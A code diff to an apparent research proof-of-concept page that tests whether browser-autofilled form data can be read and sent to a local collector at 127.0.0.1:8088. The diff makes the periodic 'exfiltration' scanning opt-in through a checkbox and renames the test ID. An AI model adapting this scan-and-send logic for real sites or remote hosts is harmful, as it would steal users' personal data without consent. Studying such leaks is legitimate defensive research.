@@ -124,7 +124,7 @@
   <section>
     <h2>Test ID</h2>
     <label>Test ID:
-      <input id="testIdInput" type="text" placeholder="exp_autofill_YYYYMMDD" style="width:320px">
+      <input id="testIdInput" type="text" placeholder="exp_leakyautofill_YYYYMMDD" style="width:320px">
     </label>
     <button id="applyTestId">Apply</button>
     <span id="testIdNow" style="margin-left:8px;color:#555;"></span>
@@ -400,6 +400,8 @@
 
   <!-- Controls -->
   <section class="controls">
+    <label><input id="enableExfil" type="checkbox"> Enable PoC exfiltration (send only to 127.0.0.1:8088)</label>
+    &nbsp;&nbsp;
     <label>Interval:
       <select id="intervalSel">
         <option value="1500">1.5s</option>
@@ -434,7 +436,7 @@
     // default test id based on date if not set by user
     if (!window.TEST_ID) {
       const ymd = new Date().toISOString().slice(0, 10).replace(/-/g, '');
-      window.TEST_ID = 'exp_autofill_' + ymd;
+      window.TEST_ID = 'exp_leakyautofill_' + ymd;
     }
     window._POC_TRIALS = window._POC_TRIALS || {};
 
@@ -708,7 +710,7 @@
           // time fields (server collector may overwrite timestamp_utc)
           timestamp_utc,                  // e.g., "2025-10-28T10:26:09Z"
           local_ts,                       // "2025-10-28 18:26:09"
-          test_id: window.TEST_ID,       // e.g., "exp_autofill_20251028"
+          test_id: window.TEST_ID,       // e.g., "exp_leakyautofill_20251028"
           trial: trialNum,                // integer
 
           // scenario choices: in-document / thirdparty-sameorigin / thirdparty-cdn / iframe
@@ -767,15 +769,19 @@
     let timer = null;
     function startScanning(intervalMs) {
       stopScanning();
-      timer = setInterval(() => { exfiltrateOnce(); }, intervalMs);
+      timer = setInterval(() => { if (document.getElementById('enableExfil').checked) exfiltrateOnce(); }, intervalMs);
       log(`Started scanning every ${intervalMs} ms`);
     }
     function stopScanning() {
       if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
     }
 
+    document.getElementById('enableExfil').addEventListener('change', (e) => {
+      if (e.target.checked) startScanning(parseInt(document.getElementById('intervalSel').value, 10));
+      else stopScanning();
+    });
     document.getElementById('intervalSel').addEventListener('change', (e) => {
-      startScanning(parseInt(e.target.value, 10));
+      if (document.getElementById('enableExfil').checked) startScanning(parseInt(e.target.value, 10));
     });
     document.getElementById('manualScan').addEventListener('click', () => exfiltrateOnce());
 
@@ -784,8 +790,7 @@
       if (document.hidden) { log('Page hidden — pausing scanning'); stopScanning(); }
     });
 
-    startScanning(3000);
-    log('PoC loaded — start the collector on 127.0.0.1:8088. Auto-exfiltration enabled.');
+    log('PoC loaded — start the collector on 127.0.0.1:8088, then enable PoC exfiltration if desired.');
   </script>
 </body>
 
